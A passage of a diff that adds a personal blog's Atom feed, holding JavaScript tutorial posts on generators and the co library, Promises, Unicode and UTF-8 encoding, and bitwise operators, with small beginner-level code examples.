+<p>You may also notice the grammer <code>function*</code>, that&#39;s called <code>generator function</code>, and you can use keyword <code>field</code> there, which works combined with <code>next()</code>. When <code>next</code> is invoked, it starts the execution of the generator. The generator runs until it encounters a <code>yield</code> expression. Then it pauses and the execution goes back to the code that called <code>next</code>.</p>
+<p>You can also pass parameters to <code>next()</code>. It behaves like this:</p>
+<div class="highlight"><pre><span class="kd">function</span><span class="o">*</span> <span class="nx">gen</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">yield</span> <span class="nx">index</span><span class="o">++</span><span class="p">;</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cm">/**  yield and next</span>
+<span class="cm"> * gen() is invoked by a next.</span>
+<span class="cm"> * when execute gen.next(88), the generator runs until</span>
+<span class="cm"> * it encounter a yield and pauses, but not give the value</span>
+<span class="cm"> * to res. when execute gen.next(888), it goes back to the</span>
+<span class="cm"> * code and give the value to res, and the value is the </span>
+<span class="cm"> * parameter passed to next.</span>
+<span class="cm"> */</span>
+<span class="kd">var</span> <span class="nx">gen</span> <span class="o">=</span> <span class="nx">gen</span><span class="p">();</span> <span class="c1">// gen() is not invoked there</span>
+<span class="nx">gen</span><span class="p">.</span><span class="nx">next</span><span class="p">(</span><span class="mi">88</span><span class="p">);</span> <span class="c1">// {value: 1, done: false} </span>
+<span class="nx">gen</span><span class="p">.</span><span class="nx">next</span><span class="p">(</span><span class="mi">888</span><span class="p">);</span> <span class="c1">// 888</span>
+</pre></div>
+<p>It is like another way to execute callback. However, we can code synchronously to express the asynchronous progress without nested function.</p>
+
+<h2 id="toc_2"><strong>for-of</strong></h2>
+<p>This expression is used to iterate over iterable objects(including Array, Map, Set, arguments object and so on). Just a generator comprehension.</p>
+<div class="highlight"><pre><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="nx">of</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">])</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span> <span class="o">*</span> <span class="nx">i</span><span class="p">);</span> 
+<span class="p">}</span>
+<span class="c1">// 1, 4, 9</span>
+</pre></div>
+
+<h2 id="toc_3"><em>co</em></h2>
+<p><code>co</code> is an ultimate generator made by TJ, using thunks or promises. A simple co example:</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">co</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;co&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="kd">function</span><span class="p">(</span><span class="nx">fn</span><span class="p">){</span>
+    <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">file</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span> <span class="nx">fn</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">co</span><span class="p">(</span><span class="kd">function</span> <span class="o">*</span><span class="p">(){</span>
+  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">yield</span> <span class="nx">read</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">yield</span> <span class="nx">read</span><span class="p">(</span><span class="s1">&#39;2.txt&#39;</span><span class="p">);</span>
+  <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">yield</span> <span class="nx">read</span><span class="p">(</span><span class="s1">&#39;3.txt&#39;</span><span class="p">);</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">([</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">]);</span>
+<span class="p">})();</span>
+</pre></div>
+<p>We pass a generator <code>fn</code> to <code>co</code> and <code>co</code> return a <code>thunk</code>. A <code>thunk</code> is just like the traditional node-style callback whith a signature of: <code>(err, res)</code>.</p>
+<div class="highlight"><pre><span class="c1">// read thunk</span>
+<span class="kd">function</span> <span class="nx">read</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">encoding</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">encoding</span><span class="p">,</span> <span class="nx">cb</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">//invoke</span>
+<span class="nx">read</span><span class="p">(</span><span class="s1">&#39;package.json&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">)(</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">str</span><span class="p">){</span>
+    <span class="c1">//...</span>
+<span class="p">})</span>
+</pre></div>
+<p>Actually, in <code>co</code>, the <code>yieldable</code> objects supports thunks, promises, generators, generator functions and array. <code>co</code> will iterate many times until the <code>fn.done</code> is <code>true</code>. A most simple <code>co</code> implement:</p>
+<div class="highlight"><pre><span class="kd">function</span> <span class="nx">co</span><span class="p">(</span><span class="nx">GenFunc</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="kd">function</span><span class="p">(</span><span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">gen</span> <span class="o">=</span> <span class="nx">GenFunc</span><span class="p">();</span>
+    <span class="p">(</span><span class="kd">function</span> <span class="nx">next</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">gen</span><span class="p">.</span><span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">gen</span><span class="p">.</span><span class="nx">next</span><span class="p">().</span><span class="nx">done</span> <span class="o">?</span> <span class="nx">cb</span> <span class="o">&amp;&amp;</span> <span class="nx">cb</span><span class="p">()</span> <span class="o">:</span> <span class="nx">next</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">})();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p><code>co</code> also support passing arguments into the generator.</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">exec</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;co-exec&#39;</span><span class="p">);</span>
+<span class="nx">co</span><span class="p">(</span><span class="kd">function</span> <span class="o">*</span><span class="p">(</span><span class="nx">cmd</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">yield</span> <span class="nx">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">res</span><span class="p">;</span>
+<span class="p">})(</span><span class="s1">&#39;pwd&#39;</span><span class="p">,</span> <span class="nx">done</span><span class="p">);</span> <span class="c1">// done is the callback function</span>
+</pre></div>
+<p><code>co</code> support error handle as well. And in <a href="https://github.com/visionmedia/co">github</a>, it says:</p>
+
+<blockquote>
+<p>Co is careful to relay any errors that occur back to the generator, including those within the thunk, or from the thunk&#39;s callback.</p>
+</blockquote>
+<p>At last, I&#39;m strongly recommend that you should <strong>read co&#39;s source code</strong>, it is less than 300 lines. Have fun:D</p>
+
+<h2 id="toc_4"><em>Reference</em></h2>
+
+<ul>
+<li><a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Guide/The_Iterator_protocol">MDN-The-Iterator-protocol</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of">MDN-for-of</a></li>
+<li><a href="http://domenic.me/2013/09/06/es6-iterators-generators-and-iterables/">es6-iterators-generators-and-iterables</a></li>
+<li><a href="https://github.com/visionmedia/co">co</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[What&#39;s Promises?]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/what-is-promises"/>
+        <published>2014-04-18T00:00:00+08:00</published>
+        <updated>2014-09-24T15:16:38+08:00</updated>
+        <id>http://tinple.io/tech/what-is-promises</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <h2 id="toc_0"><em>Asynchronous &amp;&amp; Callback</em></h2>
+<p>When <code>Node</code> brings us an asynchronous world, our applications begin to become non-blocking and much faster.
+However, it also makes our code complex and unpredictable.
+See this simple code:</p>
+<div class="highlight"><pre><span class="kd">function</span> <span class="nx">readJSON</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="nx">res</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nx">callback</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nx">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">res</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</pre></div>
+<p>The code above is somewhat ugly and we actually can&#39;t make sure what arguments input to callback, and we must do try-catch for <code>JSON.parse</code> to handle the error. Luckily, a solution for asynchronous called <code>Promises</code> help us handle errors naturally and make code clean.</p>
+
+<h2 id="toc_1"><em>Promises</em></h2>
+<p>As its name means, a promise represents the result of an asynchronous operation with three states:</p>
+
+<ul>
+<li>Pending - The initial state</li>
+<li>Fulfilled - A successful operation</li>
+<li>Rejected - A failed operation</li>
+</ul>
+<p>And once a promise is fulfilled or rejected, it is immutable. </p>
+
+<h3 id="toc_2"><em>Begin Promise</em></h3>
+<p>Let&#39;s begin with such codes:</p>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">)</span>
+  <span class="p">,</span> <span class="nx">Promise</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;promise&#39;</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">readFile</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">enc</span><span class="p">){</span>
+  <span class="k">return</span> <span class="k">new</span> <span class="nx">Promise</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">fulfill</span><span class="p">,</span> <span class="nx">reject</span><span class="p">){</span>
+    <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">enc</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">){</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="nx">reject</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+      <span class="k">else</span> <span class="nx">fulfill</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
+    <span class="p">});</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">readJSON</span><span class="p">(</span><span class="nx">filename</span><span class="p">){</span>
+  <span class="k">return</span> <span class="nx">readFile</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">res</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">res</span><span class="p">));</span>
+  <span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+</pre></div>
+<p>As we can see, we re-write our <code>readJSON</code> function, there is no unpredictable callback and we almost use <code>Promise</code> to finish our code. In our code, we use <code>new Promise</code> to construct the promise, which requires a function called resolver, and the resolver function is passed two arguments: resolve and reject.</p>
+<div class="highlight"><pre><span class="k">new</span> <span class="nx">Promise</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="p">{})</span>
+</pre></div>
+
+<h3 id="toc_3"><em>resolve and reject</em></h3>
+<p>The resolve and reject should be called with a single argument, and promise will be fulfilled or rejected with that value. A special situation is when resolve is called with a promise(A) then the returned promise takes on the state of that new promise(A). </p>
+<p>Things go easily in promise, we only need to pass the value to <code>resolve()</code> or <code>reject()</code> to wait for the result and then handle it through <code>then()</code>. We do not care the asynchronous action&#39;s creation time and eventual success or failure, just let asynchronous methods return values like 
+synchronous methods. So what actually <code>then()</code> is?</p>
+
+<h3 id="toc_4"><em>Promise.prototype.then(onFulfilled, onRejected)</em></h3>
+<p>This prototype method follows the <a href="http://promises-aplus.github.io/promises-spec/">Promises/A+ spec</a>. 
+Simply to say, it appends fulfillment and rejection handlers to the promise, and returns a new promise resolving to the return value of the called handler. And it can be chained.</p>
+<div class="highlight"><pre><span class="k">new</span> <span class="nx">Promise</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">fulfill</span><span class="p">,</span> <span class="nx">reject</span><span class="p">){})</span>
+<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">onFulfilled</span><span class="p">,</span> <span class="nx">onRejected</span><span class="p">)</span>
+<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">onFulfilled</span><span class="p">,</span> <span class="nx">onRejected</span><span class="p">)</span>
+<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">onFulfilled</span><span class="p">,</span> <span class="nx">onRejected</span><span class="p">)</span>
+<span class="c1">// ...</span>
+</pre></div>
+
+<h2 id="toc_5">Browser</h2>
+<p>Actually, there is not only node module <a href="https://github.com/then/promise">promise</a> support <code>Promises</code>, in some browser, like Chrome 32 and latest Firefox, have already support it. It is similar to what we write before.</p>
+<div class="highlight"><pre><span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">Promise</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">promise</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Promise</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+        <span class="nx">request</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;http://api.icndb.com/jokes/random&#39;</span><span class="p">);</span>
+        <span class="nx">request</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">resolve</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nx">reject</span><span class="p">(</span><span class="nb">Error</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">statusText</span><span class="p">));</span>
+            <span class="p">}</span>
+        <span class="p">};</span>
+        <span class="nx">request</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+            <span class="nx">reject</span><span class="p">(</span><span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Error fetching data&#39;</span><span class="p">));</span>
+        <span class="p">};</span>
+        <span class="nx">request</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">value</span><span class="p">.</span><span class="nx">joke</span><span class="p">);</span>
+    <span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
+    <span class="p">})</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Promise is not supported&#39;</span><span class="p">)</span>
+<span class="p">}</span>
+</pre></div>
+
+<h2 id="toc_6">More static methods</h2>
+<p>We have seen how promises help us to do with complex asynchronous code, actually, there are more advanced patterns for promise use and some of the helper methods 
+may make our Promise more concise. I just refer it simply.</p>
+
+<ul>
+<li>Promise.resolve(value)</li>
+<li>Promise.reject(reason)</li>
+<li>Promise.all(iterable)</li>
+<li>Promise.race(iterable)</li>
+</ul>
+<p>If you want to read more, see <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise">MDN</a> or
+<a href="https://www.promisejs.org/patterns/">Promise/A+</a>.</p>
+
+<h2 id="toc_7">Reference</h2>
+
+<ul>
+<li><a href="https://www.promisejs.org/">Promise/A+</a></li>
+<li><a href="https://github.com/then/promise">then/Promise</a></li>
+<li><a href="http://www.sitepoint.com/overview-javascript-promises/">overview-javascript-promises</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise">MDN</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Learn about unicode]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/learn-about-unicode"/>
+        <published>2014-03-18T00:00:00+08:00</published>
+        <updated>2014-09-24T14:50:58+08:00</updated>
+        <id>http://tinple.io/tech/learn-about-unicode</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>Actually, I have been confused about <code>character encoding</code> for a long time, and really can not figure out the relation with <code>Unicode</code> and <code>UTF-8</code>. And after my whole afternoon effort, googling many information and reading lots of posts, finally I get a preliminary understanding about it. I will try my best to explain it distinctly.</p>
+
+<h2 id="toc_0">Before Unicode</h2>
+<p>It would be a long story to explain how unicode comes. Before its existence,
+a character encoding named <strong>ASCII</strong> was created by America, is trying to rule the relation with English and Binary. And one byte corresponds one character. For more detail, see <a href="http://en.wikipedia.org/wiki/ASCII">there</a>.</p>
+<p>However, <strong>ASCII</strong> only includes 128 characters encoding. As for other languages, it is not enough. Hence, many charsets based on ASCII appears like <strong>ISO 8859</strong>,  trying to extend more characters encoding to express more language.</p>
+
+<h2 id="toc_1">Unicode</h2>
+<p>There are many encoding existing all over the world. And it would be handy if there is a encoding includes all characters, and every character corresponds one unique encoding. Hence, <code>Unicode</code> exists, trying to make it. <code>Unicode</code> is a <strong>charset</strong> which can include more than one millionsymbols, and every character encoding is unique. And <code>Unicode</code> identifies characters by a name and an interger number called its code point. For example, © is named &ldquo;copyright sign&rdquo; and has <code>U+00A9</code> - <code>0xA9</code> can bewritten as <code>169</code> in decimal - as its code point.</p>
+<p>On <a href="http://en.wikipedia.org/wiki/Unicode">Unicode wiki</a>, we can learn that the Unicode code space is divided into seventeen planes of 2^16 code points each. Some of these code points have not yet been assigned character values, some are reserved for private use, and some are permanently reserved as non-characters. The code points in each 
+plane have the hexadecimal values <code>xy0000</code> to <code>xyFFFF</code>, where <code>xy</code> is a hex value from <code>00</code> to <code>10</code>, signifying which plane 
+the values belong to. Usually we use the first plane(xy is 00) most, which called the <strong><em>Basic Multilingual Plane</em></strong> or <strong><em>BMP</em></strong>. It contains the code points from <code>U+0000</code> to <code>U+FFFF</code>. And it may express one character more than one byte.</p>
+
+<h2 id="toc_2">Problem</h2>
+<p>However, <code>Unicode</code> is just a symbol set, which doesn&#39;t rule how to
+save binary code. Although <code>Unicode</code> like <code>U+4E25</code> can even 
+express a Chinese character like <code>严</code>, how can computer regard it as 
+<code>ASCII</code> or <code>Unicode</code>? </p>
+<p>As we know, an english alphabet just needs one byte, if we rule <code>Unicode</code> uniformly, it can cause many waste. </p>
+
+<h2 id="toc_3">Implement</h2>
+<p>Hence, based on such problem, many implementations appear try to make it, like <code>UTF-8</code>, <code>UTF-16</code>, <code>UCS-2</code> and many more.</p>
+
+<h3 id="toc_4">UTF-16 &amp;&amp; UCS-2</h3>
+<p><code>UTF-16</code> is an implement which express a character using two or four bytes, while <code>UCS-2</code> just uses two bytes.</p>
+
+<h3 id="toc_5">UTF-8</h3>
+<p>Actually, <code>UTF-8</code> is the most popular one in internet. It is flexible
+to express a character using one to four bytes, and can change the length
+of byte according to different character. Next is a rule of the <code>UTF-8</code> encoding.</p>
+
+<pre><code>/*
+Unicode             | UTF-8
+hexadecimal         | binary
+0000 0000-0000 007F | 0xxxxxxx     One byte
+0000 0080-0000 07FF | 110xxxxx 10xxxxxx    Two bytes
+0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx    Three bytes
+0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 
+*/</code></pre>
+
+<h2 id="toc_6">End</h2>
+<p>This is just my little learning about unicode, if you want to learn more details, visit <a href="en.wikipedia.org/wiki/Unicode">wiki</a> to have fun.</p>
+
+<h2 id="toc_7">Reference</h2>
+
+<ul>
+<li><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html">ASCII,UTF-8,Unicode</a></li>
+<li><a href="en.wikipedia.org/wiki/UTF-16">UTF-8</a></li>
+<li><a href="en.wikipedia.org/wiki/Unicode">Unicode</a></li>
+</ul>
+]]>
+        </content>
+    </entry><entry>
+        <title type="html"><![CDATA[Bitwise Operators in javascript]]></title>
+        <author><name>Tinple</name></author>
+        <link href="http://tinple.io/tech/bitwise-operators-in-javascript"/>
+        <published>2014-02-25T00:00:00+08:00</published>
+        <updated>2014-09-24T15:15:32+08:00</updated>
+        <id>http://tinple.io/tech/bitwise-operators-in-javascript</id>
+        <content type="html" xml:base="http://tinple.io" xml:lang="en">
+            <![CDATA[ <p>Last two days, I touched frequently with <strong>Bitwise Operators</strong> in <code>Javascript</code>, but I did not figure out what the exactly it is and got 
+confused. Hence, after google many related resources, this post here to
+try to introduce the Bitwise Operators and some efficient skills using in codes. </p>
+<p>In Javascript compiler, Bitwise Operators treat their operands as a sequence
+of 32 bits, just zeros or ones. And the maximum and minimum integers are
+2147483647 and -2147483648, which represented through a 32bit signed number.</p>
+
+<h2 id="toc_0">Signed 32-bit integers</h2>
+<div class="highlight"><pre><span class="kd">var</span> <span class="nx">maximum</span> <span class="o">=</span> <span class="mi">2147483647</span><span class="p">;</span>
+<span class="nx">maximum</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="c1">// 1111111111111111111111111111111</span>
+<span class="kd">var</span> <span class="nx">minimum</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2147483648</span><span class="p">;</span>
+<span class="nx">minimum</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="c1">// -10000000000000000000000000000000</span>
+</pre></div>
+<p>Notes that the maximum and minimum above in <code>Javascript</code>. Things 
+may get strang if you exceed the scope. And if you lack the basis, go to 
+<a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators#Signed_32-bit_integers">MDN</a> to learn more.</p>
+
+<h2 id="toc_1">Bitwise Operators</h2>
+<p>In <code>Javascript</code>, the bitwise operators convert the operands to 32-bit
+integers and express it a series of bits. Each bit correspond its bit, and the 
+result in constructed bitwise. </p>
+
+<h2 id="toc_2">Bitwise Operands</h2>
+<p>As we know, <code>Javascript</code> is a weak typing programming language. Actually, all values can be bitwise operand, for example, a function or a string. However, I guess, <code>javascript</code> will convert the operand to int or long at first internally according to its engine. Some values like function or string  which can not be correctly converted will be 0.</p>
+<div class="highlight"><pre><span class="c1">// 88.88 -&gt; 88, 88 | 0 -&gt; 88</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="mf">88.88</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// 88</span>
+<span class="c1">// &#39;88.88&#39; -&gt; 88, 88 | 0 -&gt; 88</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;88.88&#39;</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// 88</span>
+<span class="c1">// &#39;sss&#39; -&gt; 0, 0 | 1 -&gt; 1</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;sss&#39;</span> <span class="o">|</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// 1</span>
+<span class="c1">// [] -&gt; 0, 0 &amp; -1 -&gt; 0</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">([]</span> <span class="o">&amp;</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// 0</span>
+</pre></div>
+
+<h2 id="toc_3">Skills with Bitwise Operators</h2>
+<p>Your codes with nice usage of bitwise operators will be much more
+efficient. And the situation below you may meet frequently.</p>
+<div class="highlight"><pre><span class="c1">// x represents the number under the scope of maximum and minimum</span>
+<span class="c1">// x &amp; 0 will return 0</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2147483647</span> <span class="o">&amp;</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// 0</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="o">-</span><span class="mi">2147483648</span> <span class="o">&amp;</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// 0</span>
+<span class="c1">// x &amp; -1 will return x</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2147483647</span> <span class="o">&amp;</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// random number x</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="o">-</span><span class="mi">2147483648</span> <span class="o">&amp;</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// random number x</span>
+<span class="c1">// x | 0 will return x</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">2147483647</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// random number x</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="o">-</span><span class="mi">2147483648</span> <span class="o">|</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// random number x</span>
+<span class="c1">// x | -1 will return -1</span>
